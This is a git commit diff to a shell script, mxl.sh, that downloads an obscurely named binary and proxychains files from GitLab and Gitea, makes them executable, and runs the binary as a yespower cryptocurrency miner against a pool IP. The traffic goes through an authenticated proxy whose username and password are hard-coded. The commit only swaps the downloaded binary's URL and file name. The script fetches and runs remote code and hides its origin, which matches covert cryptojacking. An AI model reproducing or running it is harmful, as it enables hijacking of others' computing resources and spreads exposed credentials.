075bbde213b379478ed1947bbe74693f704b1f45
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-16 21:11:44 +0700

    Update mxl.sh

--- mxl.sh
+++ mxl.sh
@@ -1,7 +1,7 @@
 port="9293" 
 user="u12novuxsvzg7n"  
 pass="11hzmsrqq2lo395w7h23fc5v26" 
-wget -q -O 96dNbbLaz7 https://gitlab.com/node.js2594450/scala/-/raw/main/ixc && chmod +x 96dNbbLaz7
+wget -q -O e96dNbbLaz788 https://gitlab.com/node.js2594450/scala/-/raw/main/ikn22 && chmod +x e96dNbbLaz788
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -18,4 +18,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./96dNbbLaz7 -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-uni) -p c=CRNC,mc=VHH  --proxy=http://u12novuxsvzg7n:11hzmsrqq2lo395w7h23fc5v26@52.5.38.201:9293 
+./panel ./e96dNbbLaz788 -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-uni) -p c=CRNC,mc=VHH  --proxy=http://u12novuxsvzg7n:11hzmsrqq2lo395w7h23fc5v26@52.5.38.201:9293 
